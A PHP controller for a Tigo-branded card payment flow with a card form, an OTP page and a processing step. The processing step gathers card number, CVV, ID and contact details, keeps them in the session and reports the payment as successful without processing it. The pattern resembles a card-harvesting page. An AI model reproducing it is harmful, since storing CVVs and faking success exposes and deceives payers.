<?php

namespace App\Controller;

use App\Core\Response;

class CardController extends BaseController
{
    public function form()
    {
        // Get invoice_id from session or query parameter
        $invoice_id = $_GET['invoice_id'] ?? $_SESSION['current_invoice_id'] ?? null;
        
        if (!$invoice_id) {
            Response::redirect('/payment');
            return;
        }
        
        // Store in session
        $_SESSION['current_invoice_id'] = $invoice_id;
        $_SESSION['payment_method'] = 'card';
        
        return $this->render('card/form', [
            'invoice_id' => $invoice_id,
            'title' => 'Pago con Tarjeta - Tigo',
            'additionalJS' => ['/js/card-form.js']
        ]);
    }
    
    public function otp()
    {
        // Get invoice_id from session or query parameter
        $invoice_id = $_GET['invoice_id'] ?? $_SESSION['current_invoice_id'] ?? null;
        
        if (!$invoice_id) {
            Response::redirect('/payment');
            return;
        }
        
        // Store in session
        $_SESSION['current_invoice_id'] = $invoice_id;
        
        return $this->render('card/otp', [
            'invoice_id' => $invoice_id,
            'title' => 'Verificación OTP - Tigo'
        ]);
    }
    
    public function process()
    {
        // TODO: Process card payment
        // This will be implemented when connecting to actual payment gateway
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            Response::redirect('/card/form');
            return;
        }
        
        $invoice_id = $_SESSION['current_invoice_id'] ?? null;
        
        if (!$invoice_id) {
            Response::redirect('/payment');
            return;
        }
        
        // Get card data from POST
        $cardData = [
            'card_number' => $_POST['cardNumber'] ?? '',
            'expiry_date' => $_POST['expiryDate'] ?? '',
            'cvv' => $_POST['cvv'] ?? '',
            'cardholder_name' => $_POST['cardholderName'] ?? '',
            'installments' => $_POST['installments'] ?? 1,
            'address' => $_POST['address'] ?? '',
            'doc_type' => $_POST['docType'] ?? '',
            'doc_number' => $_POST['docNumber'] ?? '',
            'email' => $_POST['email'] ?? ''
        ];
        
        // TODO: Validate and process payment
        // For now, just store in session
        $_SESSION['card_payment_data'] = $cardData;
        
        // Redirect to success page (to be created)
        Response::json([
            'success' => true,
            'message' => 'Pago procesado exitosamente'
        ]);
    }
}
